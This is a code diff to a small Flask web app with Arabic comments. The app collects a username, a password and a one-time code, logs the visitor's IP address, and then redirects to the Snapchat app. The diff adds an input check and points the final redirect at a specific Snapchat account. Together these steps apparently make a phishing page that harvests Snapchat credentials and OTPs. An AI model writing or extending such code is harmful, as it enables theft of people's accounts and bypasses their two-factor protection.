@@ -1,7 +1,8 @@
-from flask import Flask, render_template, request, redirect, url_for, session
+from flask import Flask, render_template, request, redirect, url_for, session, flash
 import psycopg2
 import os
 from datetime import datetime
+import re
 
 app = Flask(__name__)
 app.secret_key = 'your-secret-key-here'
@@ -39,6 +40,12 @@ def login():
 def handle_login():
     username = request.form['username']
     password = request.form['password']
+
+    # تحقق من أن الحقول تحتوي على أحرف إنجليزية فقط
+    if not re.match(r'^[A-Za-z0-9_]+$', username) or not re.match(r'^[A-Za-z0-9_]+$', password):
+        flash('Please enter username and password using English letters and numbers only.')
+        return redirect(url_for('login'))
+
     ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
     timestamp = datetime.utcnow()
 
@@ -79,7 +86,8 @@ def verify_otp():
         cursor.close()
         conn.close()
 
-    return redirect("snapchat://")
+    # التوجيه مباشرة إلى تطبيق سناب شات لعرض حساب معين
+    return redirect("snapchat://add/maymona19")
 
 @app.route('/admin')
 def admin():
